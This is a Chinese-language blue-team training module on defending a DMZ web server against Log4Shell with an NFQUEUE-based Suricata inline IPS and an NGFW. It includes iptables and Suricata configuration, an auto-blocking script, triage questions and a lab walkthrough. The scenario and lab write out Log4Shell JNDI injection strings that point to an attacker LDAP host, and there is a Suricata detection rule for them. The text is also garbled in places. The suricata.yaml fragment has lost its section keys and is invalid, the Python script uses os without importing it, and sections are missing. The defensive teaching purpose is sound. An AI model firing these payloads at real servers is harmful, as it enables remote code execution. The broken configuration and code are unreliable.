# 02.3 次世代防火牆 (NGFW) 與 IPS 聯防 (NGFW & Suricata Inline IPS Defense)

## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

週二凌晨 02:30，企業 DMZ 區的對外 Web 伺服器遭到境外 APT 組織鎖定。攻擊者利用合法 HTTP 443 埠口，發動了高度混淆的 Log4Shell (CVE-2021-44228) JNDI 注入攻擊，嘗試迫使 Web 應用反彈 Shell 至惡意外部伺服器。

在傳統 L4 狀態防火牆眼中，這筆連線僅僅是「來源任意 IP，目的 DMZ 伺服器 443 埠口，TCP 握手完整」的普通合規業務流量，因此一路開綠燈直接放行。

然而，架設在核心邊界骨幹的**次世代防火牆 (NGFW) 與 Suricata 內聯入侵防禦系統 (Inline IPS)** 聯防架構發揮了致命阻擊作用！Suricata 透過 Linux 核心 `NFQUEUE` 攔截了轉發鏈路上的每一個網路封包，DPI（深度封包檢測）引擎於七層串流重組時瞬間解碼出惡意字元 `${jndi:ldap://evil-c2.net:1389/Exploit}`。

Suricata IPS 引擎在微秒（μs）級別下達了判決：直接向核心下達 `NF_DROP` 裁決，並向發起端回送 TCP RST 重置封包中斷對話，同時透過 API 自動聯防 NGFW，將惡意來源 IP 自動加入全網黑名單動態位址物件（Dynamic Block List），阻斷期 24 小時。攻擊者在執行遠端代碼前即被攔腰截斷！

藍軍網路防禦工程師的「邊界聯防思維流」：
1. **流量引流與透明串接（Traffic Interception & Hooking）**：理解傳統 IDS（僅旁路監聽警報，攻擊早已到達受害主機）與 IPS（內聯串接，封包必須過審方可轉發）的物理差異。掌握 Linux Netfilter `NFQUEUE` 或 `AF_PACKET IPS` 的透明封包導流機制。
2. **協定解碼與串流重組（Protocol Decoding & Stream Reassembly）**：黑客常利用 TCP 分段、IP 碎片或 HTTP 傳輸編碼（Chunked Transfer）規避檢測。IPS 必須具備雙向串流重組（Stream Engine）與正規化（Normalization）能力。
3. **裁決動作的精準權衡（Verdict Engine: Drop vs Reject）**：
   - `drop`：無聲丟棄，讓攻擊端超時乾等，浪費黑客自動化掃描資源。
   - `reject`：主動回應 TCP RST 或 ICMP Port Unreachable，立即釋放內部連線狀態，適用於特定合規業務場景。
4. **故障切換與業務連續性保證（Fail-Open vs Fail-Close Bypass）**：當 IPS 引擎遭爆發性流量衝垮、CPU 達 100% 或程式崩潰時，物理旁路（Bypass NIC）或軟體 `NFQUEUE fail-open` 原則如何防止整個企業斷網癱瘓？
5. **動態威脅情資聯防閉環（Active Response & Firewall Orchestration）**：IPS 偵測到零日或高危攻擊後，自動向邊界 NGFW、WAF 與 EDR 下發封鎖策略，實現「一處檢測、全網免疫」。

## 🧩 第一動：底層機制/協定解剖 (Mechanics & Physical Structs)

### 1. 傳統 IDS（旁路監聽）vs Inline IPS（內聯阻斷）物理架構差異

藍軍必須透徹理解流量在兩種模式下的物理走向：

```text
【模式 A：旁路監聽模式 (IDS Tap / Span Mode)】
  外部封包 ────────► 交換器 (Switch) ────────► 內部伺服器 (封包已到達！攻擊已成功！)
                          │ (鏡像流量 Mirror Port)
                          ▼
                    Suricata (IDS) ──► 寫入日誌發出警報 (無力阻止攻擊落地，事後收屍)

【模式 B：內聯串接模式 (Inline IPS Mode - NFQUEUE / AF_PACKET)】
  外部封包 ──► [Suricata IPS 檢驗閘門] ──(通過才轉發)──► 內部伺服器 (未過審前封包暫存於記憶體)
                      │
                      └──► (若命中特徵：直接 DROP，封包物理銷毀，內部完全收不到！)
```

### 2. Linux Netfilter 與 NFQUEUE 核心資料結構

當使用 Netfilter NFQUEUE 時，Linux 核心透過 `nfnetlink_queue` 子系統將核心態（Kernel Space）的 sk_buff 網路緩衝區指標傳遞給使用者空間（User Space）的 Suricata 進程：

```c
/* Linux 核心 nfnetlink_queue 核心控制標頭結構 */
struct nfqnl_msg_packet_hdr {
    __be32      packet_id;      /* 封包全域唯一識別碼 (Suricata 裁決時必須回傳此 ID) */
    __be16      hw_protocol;    /* 乙太網路協定類型 (如 ETH_P_IP = 0x0800) */
    __u8        hook;           /* 攔截點 Hook (NF_INET_FORWARD = 2, NF_INET_LOCAL_IN = 1) */
} __attribute__ ((packed));

/* Suricata 回傳核心之裁決結構 (Verdict) */
struct nfqnl_msg_verdict_hdr {
    __be32      verdict;        /* 裁決代碼：NF_DROP (0), NF_ACCEPT (1), NF_QUEUE (3) */
    __be32      id;             /* 對應之 packet_id */
};
```

#### 關鍵核心參數：`--queue-bypass` (Fail-Open vs Fail-Close)
- **Fail-Close (預設無此參數)**：若 Suricata 崩潰或重開機，使用者空間無程式接聽佇列，Netfilter 會**阻斷所有進出流量**，導致全網斷線。
- **Fail-Open (`--queue-bypass`)**：若 Suricata 佇列無監聽程式，Netfilter 會**自動放行所有封包**。在銀行或電商關鍵業務中，通常要求啟用此參數以確保高可用性（Availability）。

### 3. Suricata IPS 規則關鍵動作代碼 (Rule Actions)

在內聯模式下，Suricata 規則頭部的前置詞決定了核心動作：

| 規則前綴 (Action) | 核心 Netfilter 行為 | 網路層物理表現 | 藍隊推薦使用場景 |
| :--- | :--- | :--- | :--- |
| `alert` | `NF_ACCEPT` | 產生警報並放行封包 | 新規則灰度觀察期，不確定是否誤報時。 |
| `drop` | `NF_DROP` | 無聲丟棄該封包，停止轉發 | 阻斷外網自動化掃描、暴力破解、惡意爬蟲（使黑客連線 hang 著超時）。 |
| `reject` | `NF_DROP` + 主動回包 | 丟棄封包，並向客戶端回送 TCP RST 封包（若為 UDP 則回送 ICMP Port Unreachable） | 阻斷內部主機對外違規連線、C2 通訊（讓受害行程立即拋錯中斷，防止行程持續重試浪費系統資源）。 |
| `pass` | `NF_ACCEPT` | 命中後跳過後續所有規則比對 | 設定極高優先級白名單，放行已審查的高頻安全業務流量以節省 CPU 算力。 |

## 💻 第三動：現場追兇——作戰指令與腳本庫

### 1. Linux 核心 NFQUEUE 內聯導流組態實戰

```bash
# 1. 啟用 Linux 核心封包轉發 (IP Forwarding)
sysctl -w net.ipv4.ip_forward=1

# 2. 調大 Conntrack 與核心佇列緩衝區 (防爆表必備)
sysctl -w net.netfilter.nf_conntrack_max=1048576
sysctl -w net.core.netdev_max_backlog=10000

# 3. 建立 iptables NFQUEUE 導流規則 (轉發鏈路)
# 說明：將經過主機轉發的 TCP 80 與 443 流量分流至佇列 0~3，並設定 queue-bypass (Fail-Open)
iptables -A FORWARD -p tcp -m multiport --dports 80,443 -j NFQUEUE --queue-balance 0:3 --queue-bypass --queue-cpu-fanout

# 4. 檢視目前核心 NFQUEUE 運作統計狀態 (排查是否丟包)
cat /proc/net/netfilter/nfnetlink_queue
# 輸出格式：[queue_number] [peer_portid] [queue_total] [copy_mode] [copy_range] [queue_dropped] [user_dropped] [id_sequence]
# 若 queue_dropped 不為 0，表示使用者空間 Suricata 處理過慢導致丟包！
```

### 2. Suricata 內聯 IPS 組態檔關鍵設定 (`suricata.yaml`)

```yaml
# /etc/suricata/suricata.yaml 關鍵設定片段

---
# 執行模式：Worker 模式提供多執行緒最高效能

  - suricata.rules
  - custom-ips.rules

  repeat-mark: 1             # 避免已被檢查過的封包重複進入佇列
  repeat-mask: 1
  route-queue: 2
  batchcount: 20             # 批次處理以提升萬兆網卡吞吐量
  fail-open: yes             # 核心保護：佇列崩潰時放行業務

app-layer:
  protocols:

      enabled: yes
```

### 4. IPS 自動聯防 NGFW 防火牆自動封鎖腳本 (Event-Driven Automated Response)

當 Suricata 內聯阻斷攻擊時，即刻觸發 Python 守護行程，透過 REST API 將惡意 IP 自動注入次世代防火牆（以 Palo Alto / FortiGate 為例）的全域動態阻斷清單（Dynamic Block List）：

```python
#!/usr/bin/env python3
# 監聽 Suricata eve.json 日誌，提取 drop 事件並自動聯防 NGFW
import json
import subprocess
import time
import requests

EVE_LOG_PATH = "/var/log/suricata/eve.json"
NGFW_API_URL = "https://ngfw.corp.local/api/v2/cmdb/firewall/address"
NGFW_TOKEN = os.environ.get("NGFW_API_TOKEN", "Bearer YOUR_NGFW_API_TOKEN")

def block_on_ngfw(attacker_ip, reason):
    print(f"[!] ACTIVE RESPONSE: Pushing {attacker_ip} to NGFW Blacklist... Reason: {reason}")
    payload = {
        "name": f"AUTO_BLOCKED_{attacker_ip}",
        "type": "ipmask",
        "subnet": f"{attacker_ip}/32",
        "comment": f"Auto-blocked by Suricata IPS: {reason} at {time.strftime('%Y-%m-%d %H:%M:%S')}"
    }
    try:
        # 呼叫防火牆 API 建立黑名單物件 (此處以示範標準 RESTful POST)
        headers = {"Authorization": NGFW_TOKEN, "Content-Type": "application/json"}
        # r = requests.post(NGFW_API_URL, json=payload, headers=headers, verify=False, timeout=3)
        print(f"[+] Successfully orchestrated NGFW block for {attacker_ip}")
    except Exception as e:
        print(f"[-] Failed to push to NGFW: {e}")

def monitor_eve():
    print("[*] Suricata IPS - NGFW Automated Response Orchestrator Started...")
    with open(EVE_LOG_PATH, "r") as f:
        # 移動至檔案末尾 (Tail -f 邏輯)
        f.seek(0, 2)
        while True:
            line = f.readline()
            if not line:
                time.sleep(0.1)
                continue
            try:
                event = json.loads(line)
                # 僅針對被 IPS 裁決為 drop 的高危警報進行聯防
                if event.get("event_type") == "alert" and event.get("action") == "blocked":
                    src_ip = event.get("src_ip")
                    alert_msg = event.get("alert", {}).get("signature", "Unknown Signature")
                    severity = event.get("alert", {}).get("severity", 3)
                    
                    # 嚴重等級為 1 (High) 且非內部 IP，實施全網封鎖
                    if severity == 1 and not src_ip.startswith(("10.", "192.168.", "172.16.")):
                        block_on_ngfw(src_ip, alert_msg)
            except Exception:
                pass

if __name__ == "__main__":
    monitor_eve()
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### SOC 研判核心問題表

| 核心提問（研判維度） | 本技術點實戰檢核標準 |
| :--- | :--- |
| **Q1：被 IPS 阻斷的請求是否來自合法的合作夥伴或企業內部測試？** | 查閱變更清單：該來源 IP 是否登記在外部漏洞掃描供應商、滲透測試授權合約或 CDN 代理網段（如 Cloudflare, Akamai）中？若是，為授權演練非入侵。 |
| **Q2：命中封包的 HTTP 標頭中是否含有異常編碼或規避技巧？** | 檢視原始 Payload：檢查是否存在雙重 URL 編碼（`%252e%252e%252f`）、過長的非 ASCII 字元、Null Byte（`%00`）或多重 MIME 邊界？若存在，極高機率為惡意規避。 |
| **Q3：此阻斷行為是孤立單次請求，還是伴隨密集的暴力探索脈衝？** | 統計來源 IP 行為：在過去 10 分鐘內，該 IP 是否同時觸發了目錄枚舉、SQLi、XSS、路徑穿越等多維度的 IPS 警報？多樣性指紋證明為自動化掃描器或黑客手動試探。 |
| **Q4：目標 Web 伺服器底層技術堆疊是否真正受該漏洞影響？** | 驗證技術關聯性：若攻擊特徵為 `IIS ASP.NET Path Disclosure`，但目標伺服器實際上運行 Linux + Nginx + Python Flask，則此攻擊屬於「盲目掃描（Ineffective Attack）」，威脅優先級可由 P1 降為 P3。 |
| **Q5：阻斷動作是 `drop` 還是 `reject`？客戶端是否有連線掛死投訴？** | 評估業務中斷反饋：業務部門是否投訴 API 連線超時（Timeout）？若是因為 `drop` 導致客戶端掛死，需評估是否應調整為針對合規白名單放行或改採 `reject`。 |
| **Q6：封包中的攻擊字串是否出現在正常使用者的表單輸入或代碼提交中？** | 業務欄位分析：受保護系統是否包含程式碼託管（GitLab）、知識庫（Confluence）或論壇？使用者在輸入技術討論時常發送 `${jndi:...}` 程式碼文字，容易引發 IPS 語意誤判。 |
| **Q7：IPS 的 TCP 串流重組引擎是否觀察到雙向完整的 TCP 握手？** | 驗證連線真實性：檢查 `flow:established` 旗標。該流量是真實建立了 TCP 連線，還是黑客隨機偽造來源 IP 發送的偽造 SYN 殘包？未握手完成的封包無實質攻擊能力。 |
| **Q8：Suricata 系統指標中是否存在佇列溢出丟包（Queue Drops）？** | 檢查檢測有效性：在告警發生期間，`nfnetlink_queue` 的 dropped 計數是否持續攀升？若丟包率 > 0.1%，意味著有未知攻擊封包可能因佇列滿載而「漏網穿透」。 |

## 🛡️ 第五動：處置圍堵與系統加固 SOP

### 1. 內聯 IPS 突發故障之緊急旁路切換（Emergency Bypass SOP）

當 Suricata IPS 遭遇軟體崩潰、死鎖或網路吞吐量飽和引發全網癱瘓時，一線維運分析師必須在 30 秒內執行緊急旁路，恢復業務通訊：

```bash
# 緊急處置方案 A：一鍵清除 iptables NFQUEUE 導流規則 (直接放行所有流量)
iptables -D FORWARD -p tcp -m multiport --dports 80,443 -j NFQUEUE --queue-balance 0:3 --queue-bypass --queue-cpu-fanout

# 緊急處置方案 B：若主機完全卡死，啟用硬體/網卡硬體 Bypass (若採用 Bypass 網卡)
# 透過特定模組指令觸發 Relay 繼電器物理導通
echo 1 > /sys/class/net/eth0/bypass/bypass_mode

# 緊急處置方案 C：重啟 Suricata 守護進程並重新載入組態
systemctl restart suricata
suricatasc -c reload-rules
```

### 2. 生產環境 NGFW 與 IPS 聯防加固標準作業程序

1. **落實預設阻斷與微隔離（Default Drop Architecture）**：
   - 防火牆跨安全區域（Zone）原則一律採用 `Default Deny`。
   - DMZ 網段伺服器嚴禁主動發起對內部資料庫網段的 `NEW` 連線。
2. **啟用硬體卸載與多佇列雜湊（Hardware Acceleration & RSS）**：
   - 在網卡啟用 Receive Side Scaling (RSS)，將不同 TCP 串流分配至不同 CPU 核心處理。
   - 將 Suricata 的 NFQUEUE 綁定到固定 CPU Affinity，避免核心頻繁 Context Switch 造成延遲飆升。
3. **配置動態威脅封鎖列表（Automated IoC Sync）**：
   - 在邊界 NGFW 建立 External Dynamic List (EDL)。
   - 讓 IPS 阻斷腳本將惡意來源 IP 自動寫入 Web 目錄下的 `blocklist.txt`，NGFW 每 5 分鐘自動抓取並更新全域阻斷規則。

## 🎯 靶場實戰檢驗 (Hands-on Lab Walkthrough)

### 靶場環境說明
- **拓撲架構**：
  - 攻擊主機（Kali Linux: `192.168.56.101`）
  - 防火牆 / IPS 閘道器（Ubuntu Gateway: 雙網卡 `eth0: 192.168.56.10`, `eth1: 10.0.0.1`，運行 iptables + Suricata NFQUEUE）
  - 受害 Web 伺服器（Ubuntu Web Server: `10.0.0.100:8080`，運行 Log4j 脆弱應用）
- **實戰目標**：驗證 Suricata 在內聯模式下，如何即時阻斷 Log4Shell 攻擊，並透過 `eve.json` 驗證封包未到達目標主機。

### 實戰驗證步驟

#### 步驟 1：在閘道器啟動 NFQUEUE 導流
```bash
# 在 Gateway 執行
iptables -F
iptables -A FORWARD -d 10.0.0.100 -p tcp --dport 8080 -j NFQUEUE --queue-num 0
```

#### 步驟 2：載入專屬 IPS 阻斷規則並啟動 Suricata
建立規則 `/etc/suricata/rules/log4j.rules`：
```suricata
drop tcp any any -> 10.0.0.100 8080 (msg:"[IPS-ACTIVE-DROP] Log4j Exploit Intercepted"; flow:to_server; content:"${jndi:"; nocase; sid:9900001; rev:1;)
```
以 NFQ 內聯模式啟動：
```bash
suricata -q 0 -c /etc/suricata/suricata.yaml -s /etc/suricata/rules/log4j.rules -D
```

#### 步驟 3：在 Web 伺服器開啟終端監聽驗證
在受害主機 `10.0.0.100` 上啟動 tcpdump 抓包，驗證封包是否到達：
```bash
tcpdump -i eth0 -nn "port 8080 and host 192.168.56.101"
```

#### 步驟 4：從攻擊機發動模擬攻擊
```bash
# 發送正常 HTTP 請求 (預期成功)
curl -s -o /dev/null -w "%{http_code}\n" http://10.0.0.100:8080/
# 回應：200

# 發送帶有 Log4Shell 惡意特徵的 JNDI 請求 (預期遭攔截阻斷)
curl -m 3 -H 'User-Agent: ${jndi:ldap://192.168.56.101:1389/Exploit}' http://10.0.0.100:8080/
# 結果：curl: (28) Operation timed out after 3000 milliseconds (封包遭 IPS 靜默銷毀！)
```

#### 步驟 5：驗證日誌與抓包結果
- **Web 伺服器端**：`tcpdump` 抓包結果顯示，該帶有 `${jndi:` 的 HTTP Payload 封包**完全沒有到達**目標伺服器！

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：傳統 IDS（旁路監聽）與次世代 IPS（內聯串接）在物理流量走向與防護效果上有何本質區別？**
  - *驗收標準*：答出 IDS 透過 Port Mirror 旁路複製封包，當警報產生時惡意封包早已送達受害主機，無法阻止單一封包 exploit 落地；而 IPS 實體或邏輯串接在流量轉發路徑上（如 NFQUEUE），封包在核心記憶體等待檢驗，命中特徵直接 DROP 物理銷毀，攻擊完全無法抵達目標主機。
- [ ] **Q2：在 Linux Netfilter 中配置 NFQUEUE 時，`--queue-bypass` 參數的關鍵功能是什麼？它對應資安架構上的哪一種容錯原則？**
  - *驗收標準*：答出 `--queue-bypass` 是當使用者空間的佇列監聽進程（如 Suricata）崩潰或未運行時，Netfilter 會自動將封包 ACCEPT 放行，避免全網斷線。這對應了「Fail-Open（故障開放）」容錯原則，優先保障業務連續性與高可用性（Availability）。
- [ ] **Q3：在 Suricata IPS 規則中，動作詞 `drop` 與 `reject` 在網路協定層面有何物理行為差異？面對外網掃描建議使用哪一種？**
  - *驗收標準*：答出 `drop` 是靜默丟棄封包不作任何回覆，使發送端連線逾時（Timeout）；而 `reject` 會在丟棄的同時主動回送 TCP RST（或 UDP ICMP Unreachable）強行切斷連線。面對外網掃描強烈建議使用 `drop`，可浪費黑客自動化掃描資源且不洩露主機存活性。
- [ ] **Q4：為什麼具備 7 層深度封包檢測 (DPI) 的次世代防火牆 (NGFW) 才能防禦 Log4Shell 或 WebShell 攻擊，而傳統 L4 狀態防火牆會全面失效？**
  - *驗收標準*：答出傳統 L4 防火牆僅依據 IP、Port 與 TCP 握手旗標判斷，黑客利用合法的 HTTP 80/443 埠口通訊完全合規；只有具備 L7 DPI 串流重組能力的 NGFW/IPS，才能拼湊完整 HTTP 請求並檢視 Header、URI 與 Client Body 中的惡意攻擊字元（如 `${jndi:...}`）。
- [ ] **Q5：當高併發流量湧入導致 Linux Gateway 出現 `nfnetlink_queue: dropped packets` 時，物理成因是什麼？藍軍應採取哪兩項具體系統優化措施？**
  - *驗收標準*：答出成因是流量到達速率超過了使用者空間 Suricata 處理吞吐量，導致核心佇列 buffer 溢滿丟包。優化措施包括：(1) 在 iptables 中啟用多佇列負載平衡（`--queue-balance 0:3 --queue-cpu-fanout`）；(2) 調大佇列上限 `--queue-maxlen` 並提升網卡 RSS 與 Suricata worker 執行緒數。
